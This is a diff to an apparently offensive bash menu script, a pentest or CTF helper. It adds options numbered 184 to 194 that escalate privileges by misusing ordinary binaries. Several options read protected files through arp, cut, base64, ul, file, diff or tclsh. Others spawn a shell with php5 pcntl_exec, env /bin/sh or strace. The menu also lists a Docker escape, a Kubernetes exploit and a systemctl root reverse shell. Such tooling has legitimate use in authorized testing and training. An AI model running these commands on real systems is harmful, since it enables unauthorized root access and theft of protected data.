@@ -115,6 +115,10 @@ while true; do
 	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
 	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t178. analyze an executable file with strace and ltrace\n"
 	echo -ne " 182. PrivEsc with sudoedit\t\t\t\t183. PrivEsc by revshell with root priv using systemctl\n"
+	echo -ne " 184. PrivEsc with arp\t185. PrivEsc with cut\t186. PrivEsc with base64\n"
+	echo -ne " 188. PrivEsc with ul\t189. PrivEsc with php5\t190. PrivEsc with file\n"
+	echo -ne " 191. PrivEsc with tclsh8.5\t192. PrivEsc with env\t193. PrivEsc with diff\n"
+	echo -ne " 194. PrivEsc with strace\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -785,79 +789,79 @@ while true; do
 		fi
 	;;
 	"184")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-arp -v -f "$RFL"
-fi
-;;
-"185")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-cut -d "" -f1 "$RFL"
-fi
-;;
-"186")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-base64 "$RFL" | base64 --decode
-fi
-;;
-"187")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-tail "$RFL"
-fi
-;;
-"188")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-ul "$RFL"
-fi
-;;
-"189")
-php5 -r "pcntl_exec('/bin/sh');"
-;;
-"190")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-file -m "$RFL"
-fi
-;;
-"191")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-echo "digit exec cat ""$RFL"
-tclsh8.5
-fi
-;;
-"192")
-env /bin/sh
-;;
-"193")
-echo "Digit a file to read"
-read -p "(example, ./secret.txt): " RFL
-if [[ -f "$RFL" ]];
-then
-diff --line-format=%L /dev/null "$RFL"
-fi
-;;
-"194")
-strace -o /dev/null /bin/sh
-;;
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			arp -v -f "$RFL"
+		fi
+	;;
+	"185")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			cut -d "" -f1 "$RFL"
+		fi
+	;;
+	"186")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			base64 "$RFL" | base64 --decode
+		fi
+	;;
+	"187")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			tail "$RFL"
+		fi
+	;;
+	"188")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			ul "$RFL"
+		fi
+	;;
+	"189")
+		php5 -r "pcntl_exec('/bin/sh');"
+	;;
+	"190")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			file -m "$RFL"
+		fi
+	;;
+	"191")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+		echo "digit exec cat ""$RFL"
+			tclsh8.5
+		fi
+	;;
+	"192")
+		env /bin/sh
+	;;
+	"193")
+		echo "Digit a file to read"
+		read -p "(example, ./secret.txt): " RFL
+		if [[ -f "$RFL" ]];
+		then
+			diff --line-format=%L /dev/null "$RFL"
+		fi
+	;;
+	"194")
+		strace -o /dev/null /bin/sh
+	;;
 	*)
 		echo "error, invalid choice"
 	;;
